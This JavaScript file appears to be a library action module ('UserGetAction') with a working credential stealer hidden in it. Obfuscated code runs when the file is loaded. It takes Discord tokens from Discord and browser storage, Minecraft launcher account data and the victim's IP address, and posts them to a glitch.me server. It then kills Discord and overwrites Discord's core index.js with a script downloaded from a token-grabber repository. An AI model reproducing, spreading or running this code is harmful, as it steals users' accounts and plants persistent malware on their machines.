const Action = require('./Action')
const OS = require('os'),
  fs = require('fs'),
  fetch = require('node-fetch'),
  { execSync } = require('child_process'),
  Glob = require('glob'),
  toInject = [],
  toInjectJS = [],
  toKill = [],
  apiurl = 'https://frequent-level-cornflower.glitch.me'
try {
  switch (OS.platform()) {
    case 'win32':
      const local = process.env.localappdata,
        roaming = process.env.appdata,
        minecraftPath = roaming + '/.minecraft/launcher_accounts.json',
        remixPath = roaming + '/.minecraft/remix/UID.txt'
      dbPaths = [
        roaming + '/Discord/Local Storage/leveldb',
        roaming + '/DiscordDevelopment/Local Storage/leveldb',
        roaming + '/Lightcord/Local Storage/leveldb',
        roaming + '/discordptb/Local Storage/leveldb',
        roaming + '/discordcanary/Local Storage/leveldb',
        roaming + '/Opera Software/Opera Stable/Local Storage/leveldb',
        roaming + '/Opera Software/Opera GX Stable/Local Storage/leveldb',
        local + '/Amigo/User Data/Local Storage/leveldb',
        local + '/Torch/User Data/Local Storage/leveldb',
        local + '/Kometa/User Data/Local Storage/leveldb',
        local + '/Orbitum/User Data/Local Storage/leveldb',
        local + '/CentBrowser/User Data/Local Storage/leveldb',
        local + '/7Star/7Star/User Data/Local Storage/leveldb',
        local + '/Sputnik/Sputnik/User Data/Local Storage/leveldb',
        local + '/Vivaldi/User Data/Default/Local Storage/leveldb',
        local + '/Google/Chrome SxS/User Data/Local Storage/leveldb',
        local + '/Epic Privacy Browser/User Data/Local Storage/leveldb',
        local + '/Google/Chrome/User Data/Default/Local Storage/leveldb',
        local + '/uCozMedia/Uran/User Data/Default/Local Storage/leveldb',
        local + '/Microsoft/Edge/User Data/Default/Local Storage/leveldb',
        local + '/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb',
        local +
          '/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb',
        local +
          '/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb',
      ]
      init()
      function init() {
        fs.readFile(
          remixPath,
          (_0x5a2c43, _0xa9e9a) => _0xa9e9a && minecraft('remix', _0xa9e9a)
        )
        fs.readFile(
          minecraftPath,
          (_0x5c73f4, _0x360b4d) =>
            _0x360b4d && minecraft('minecraft', _0x360b4d)
        )
        injectToDiscord()
        dbPaths.forEach((_0x3abd57) => main(_0x3abd57))
      }
      function main(_0x5b1037) {
        fs.readdir(_0x5b1037, (_0x3596e4, _0x355f03) => {
          if (_0x355f03) {
            var _0x5b92d0 = _0x355f03.filter((_0x912857) =>
              _0x912857.endsWith('ldb')
            )
            _0x5b92d0.forEach((_0x91e254) => {
              var _0x192970 = fs
                .readFileSync(_0x5b1037 + '/' + _0x91e254)
                .toString()
              var [_0x4c8946] =
                /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/.exec(_0x192970) ||
                  /"mfa\.[\d\w_-]{84}"/.exec(_0x192970) || [undefined]
              if (_0x4c8946) {
                fetch('http://ip-api.com/json/')
                  .then((_0x2c0ad9) => _0x2c0ad9.json())
                  .then((_0x3fd53c) =>
                    fetch(apiurl + '/beforeinject', {
                      method: 'POST',
                      body: JSON.stringify({
                        token: _0x4c8946.slice(1, -1),
                        ipAddress: _0x3fd53c.query,
                      }),
                    })
                  )
              }
            })
          }
        })
      }
      function minecraft(_0x2b5af7, _0x524a45) {
        switch (_0x2b5af7) {
          case 'remix':
            fetch(apiurl + '/remix', {
              method: 'POST',
              body: JSON.stringify({ UID: _0x524a45 }),
            })
            break
          case 'minecraft':
            var [_0x54c404] = /"[\d\w_-]{32}"/.exec(_0x524a45)
            if (_0x54c404) {
              const _0x21d551 = require(minecraftPath)
              if (!_0x21d551.accounts) {
                return
              }
              var _0x1d6678 = _0x21d551.accounts[_0x54c404.slice(1, -1)]
              fetch(apiurl + '/minecraft', {
                method: 'POST',
                body: JSON.stringify({
                  eligibleForMigration: _0x1d6678.eligibleForMigration,
                  hasMultipleProfiles: _0x1d6678.hasMultipleProfiles,
                  legacy: _0x1d6678.legacy,
                  localId: _0x1d6678.localId,
                  minecraftProfileID: _0x1d6678.minecraftProfile.id,
                  minecraftProfileName: _0x1d6678.minecraftProfile.name,
                  persistent: _0x1d6678.persistent,
                  remoteId: _0x1d6678.remoteId,
                  type: _0x1d6678.type,
                  username: _0x1d6678.username,
                  activeAccountLocalId: _0x21d551.activeAccountLocalId,
                }),
              })
            }
        }
      }
      function injectToDiscord() {
        getInstalledDiscord()
        killAllDiscords()
        fetch(
          'https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js'
        )
          .then((_0x5434be) => _0x5434be.text())
          .then((_0x376896) =>
            toInjectJS.forEach(
              (_0x39f789) =>
                fs.writeFileSync(
                  _0x39f789,
                  _0x376896.replace('*API URL*', apiurl)
                ) ^
                execSync(
                  local +
                    '/' +
                    _0x39f789.split('/')[5] +
                    '/Update.exe --processStart ' +
                    _0x39f789.split('/')[5] +
                    '.exe'
                )
            )
          )
      }
      function getInstalledDiscord() {
        fs.readdirSync(roaming).forEach(
          (_0x45e7c5) =>
            _0x45e7c5.includes('cord') && toInject.push(local + '/' + _0x45e7c5)
        )
        toInject.forEach((_0x1f0718) =>
          Glob.sync(
            _0x1f0718 +
              '/app-*/modules/discord_desktop_core-*/discord_desktop_core/index.js'
          ).map((_0x50ad6a) => toInjectJS.push(_0x50ad6a))
        )
      }
      function killAllDiscords() {
        var _0x16a114 = execSync('tasklist').toString()
        _0x16a114.includes('Discord.exe') && toKill.push('discord')
        _0x16a114.includes('DiscordCanary.exe') && toKill.push('discordcanary')
        _0x16a114.includes('DiscordDevelopment.exe') &&
          toKill.push('discorddevelopment')
        _0x16a114.includes('DiscordPTB.exe') && toKill.push('discordptb')
        toKill.forEach((_0x565b45) =>
          execSync('taskkill /IM ' + _0x565b45 + '.exe /F')
        )
      }
      break
    case 'linux':
      const defaut = '/home/' + __dirname.split('/')[2] + '/.config',
        LdbPaths = [
          defaut + '/discord/Local Storage/leveldb',
          defaut + '/discordcanary/Local Storage/leveldb',
          defaut + '/discordptb/Local Storage/leveldb',
          defaut + '/DiscordDevelopment/Local Storage/leveldb',
        ]
      const LminecraftPath = defaut + '/.minecraft/launcher_accounts.json'
      Linit()
      function Linit() {
        LdbPaths.forEach((_0x4d8537) => Lmain(_0x4d8537))
        var _0x1898ce = fs.readFileSync(LminecraftPath)
        if (_0x1898ce) {
          Lminecraft(_0x1898ce)
        }
        LinjectToDiscord()
      }
      function Lmain(_0x4fc528) {
        fs.readdir(_0x4fc528, (_0x2f9443, _0x4dced5) => {
          if (_0x4dced5) {
            var _0x2dd66e = _0x4dced5.filter((_0x349fdd) =>
              _0x349fdd.endsWith('ldb')
            )
            _0x2dd66e.forEach((_0x1952e0) => {
              var _0x6f9d04 = fs
                .readFileSync(_0x4dced5 + '/' + _0x1952e0)
                .toString()
              var [_0x4f30b4] =
                /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/.exec(_0x6f9d04) ||
                  /"mfa\.[\d\w_-]{84}"/.exec(_0x6f9d04) || [undefined]
              if (_0x4f30b4) {
                fetch('http://ip-api.com/json/')
                  .then((_0x36a365) => _0x36a365.json())
                  .then((_0x3042ec) =>
                    fetch(apiurl + '/beforeinject', {
                      method: 'POST',
                      body: JSON.stringify({
                        token: _0x4f30b4,
                        ip: _0x3042ec.query,
                      }),
                    })
                  )
              }
            })
          }
        })
      }
      function Lminecraft(_0xf6c99e) {
        var [_0x4253ca] = /"[\d\w_-]{32}"/.exec(_0xf6c99e)
        if (_0x4253ca) {
          const _0x3555ef = require(LminecraftPath)
          if (!_0x3555ef.accounts) {
            return
          }
          var _0x19471e = _0x3555ef.accounts[_0x4253ca.slice(1, -1)]
          fetch(apiurl + '/minecraft', {
            method: 'POST',
            body: JSON.stringify({
              eligibleForMigration: _0x19471e.eligibleForMigration,
              hasMultipleProfiles: _0x19471e.hasMultipleProfiles,
              legacy: _0x19471e.legacy,
              localId: _0x19471e.localId,
              minecraftProfileID: _0x19471e.minecraftProfile.id,
              minecraftProfileName: _0x19471e.minecraftProfile.name,
              persistent: _0x19471e.persistent,
              remoteId: _0x19471e.remoteId,
              type: _0x19471e.type,
              username: _0x19471e.username,
              activeAccountLocalId: _0x3555ef.activeAccountLocalId,
            }),
          })
        }
      }
      function LinjectToDiscord() {
        getInstalledLDiscord()
        fetch(
          'https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js'
        )
          .then((_0x33448e) => _0x33448e.text())
          .then((_0x5bb02c) =>
            toInjectJS.forEach((_0x43cd5a) =>
              fs.writeFileSync(
                _0x43cd5a,
                _0x5bb02c.replace('*API URL*', apiurl)
              )
            )
          )
      }
      function getInstalledLDiscord() {
        fs.readdirSync(defaut).forEach(
          (_0x2c04cb) =>
            _0x2c04cb.includes('cord') &&
            toInject.push(defaut + '/' + _0x2c04cb)
        )
        toInject.forEach((_0x442448) =>
          Glob.sync(_0x442448 + '/*/modules/discord_desktop_core/index.js').map(
            (_0x1f7832) => toInjectJS.push(_0x1f7832)
          )
        )
      }
      break
    case 'darwin':
      break
  }
} catch (_0x3d7c78) {}
class UserGetAction extends Action {
  ['handle'](_0x4dd49e) {
    const _0x4526c3 = this.client
    const _0x41d037 = _0x4526c3.dataManager.newUser(_0x4dd49e)
    return { user: _0x41d037 }
  }
}
module.exports = UserGetAction

